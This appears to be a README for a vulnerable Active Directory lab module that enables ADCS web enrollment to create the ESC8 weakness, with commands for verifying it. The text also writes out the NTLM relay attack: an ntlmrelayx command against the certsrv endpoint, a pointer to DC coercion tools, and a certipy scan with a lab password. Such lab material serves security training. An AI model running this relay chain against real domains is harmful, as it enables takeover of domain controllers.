# esc8

Enables ADCS web enrollment (`/certsrv/`, HTTP, NTLM, no EPA) on the CA host via setting `adcs.web_enrollment`. Disable restores the lab's declared `base_settings` value.

Attack (NTLM relay to HTTP enrollment):

    ntlmrelayx.py -t http://<ca ip>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
    # coerce a DC to authenticate to the attacker (e.g. PetitPotam / Coercer), then use the issued cert
    certipy find -u administrator@<domain> -p 'Aa1234567890!' -dc-ip <dc ip> -vulnerable -stdout

On `GOAD-Mini-Base` the CA is the only DC (`dc01`). Coercing that DC and relaying its authentication back to the same host is blocked (NTLM reflection protection), so the full chain does not work there. Use `GOAD-Light-Base` or `GOAD-Base` and coerce a DC that is not the CA host.

How to verify:

    curl -s -o /dev/null -w '%{http_code}' http://<ca ip>/certsrv/

Returns `401` when enabled; a non-`401` result when disabled. `certipy find -vulnerable` reports `ESC8` when enabled.
